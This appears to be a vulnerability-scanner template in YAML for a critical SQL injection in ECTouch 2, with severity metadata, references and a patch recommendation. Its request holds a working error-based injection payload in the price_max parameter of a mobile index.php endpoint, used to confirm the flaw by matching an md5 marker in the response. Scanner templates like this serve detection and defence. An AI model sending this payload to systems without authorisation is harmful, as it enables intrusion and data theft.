id: etouch-v2-sqli
info:
  name: ECTouch 2 - SQL Injection
  author: princechaddha
  severity: critical
  description: ECTouch 2 contains a SQL injection vulnerability which allows an attacker
    to access sensitive data, modify content and execute unauthorized administrative
    actions.
  reference:
  - https://github.com/mstxq17/CodeCheck/
  - https://www.anquanke.com/post/id/168991
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  tags: etouch,sqli
  metadata:
    impact: The impact of the etouch-v2-sqli vulnerability in ECTouch 2 is that an
      attacker can gain unauthorized access to sensitive information, manipulate data,
      and perform administrative operations without authorization.
    recommendation: It is strongly recommended to immediately patch the SQL injection
      vulnerability in ECTouch 2 to prevent potential unauthorized access to sensitive
      information and administrative operations.
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5({{num}}),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)'''''
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    words:
    - '{{md5({{num}})}}'
    part: body
